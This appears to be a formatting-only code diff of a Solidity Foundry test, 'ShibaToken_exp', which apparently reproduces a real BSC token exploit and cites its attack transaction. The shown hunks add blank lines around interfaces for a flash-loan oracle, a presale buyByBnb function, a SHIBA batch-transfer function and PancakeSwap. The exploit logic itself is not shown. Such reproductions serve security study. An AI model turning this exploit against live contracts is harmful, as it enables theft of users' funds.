@@ -10,34 +10,45 @@ import "forge-std/Test.sol";
 // Attack Tx : https://explorer.phalcon.xyz/tx/bsc/0x75a26224da9faf37c2b3a4a634a096af7fec561f631a02c93e11e4a19d159477
 
 interface IDPPOracle {
+
     function flashLoan(uint256 baseAmount, uint256 quoteAmount, address _assetTo, bytes calldata data) external;
+
 }
 
 interface IERC20 {
+
     function approve(address spender, uint256 amount) external returns (bool);
     function transfer(address to, uint256 value) external returns (bool);
     function balanceOf(address) external view returns (uint256);
+
 }
 
 interface IWBNB is IERC20 {
+
     function deposit() external payable;
     function withdraw(uint256) external;
+
 }
 
 interface ICO {
+
     function buyByBnb(address token) external payable;
+
 }
 
 interface ISHIBA is IERC20 {
+
     struct Airdrop {
         address wallet;
         uint256 amount;
     }
 
     function batchTransferLockToken(Airdrop[] memory _airdrops) external;
+
 }
 
 interface IPancakePair {
+
     event Approval(address indexed owner, address indexed spender, uint256 value);
     event Transfer(address indexed from, address indexed to, uint256 value);
 
@@ -94,9 +105,11 @@ interface IPancakePair {
     function sync() external;
 
     function initialize(address, address) external;
+
 }
 
 interface IPancakeRouter {
+
     function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);
     function swapExactTokensForETHSupportingFeeOnTransferTokens(
         uint256 amountIn,
@@ -105,9 +118,11 @@ interface IPancakeRouter {
         address to,
         uint256 deadline
     ) external;
+
 }
 
 contract ShibaToken_exp is Test {
+
     address immutable r = address(this);
 
     receive() external payable {}
@@ -178,4 +193,5 @@ contract ShibaToken_exp is Test {
     fallback() external payable {
         revert("no such function");
     }
+
 }
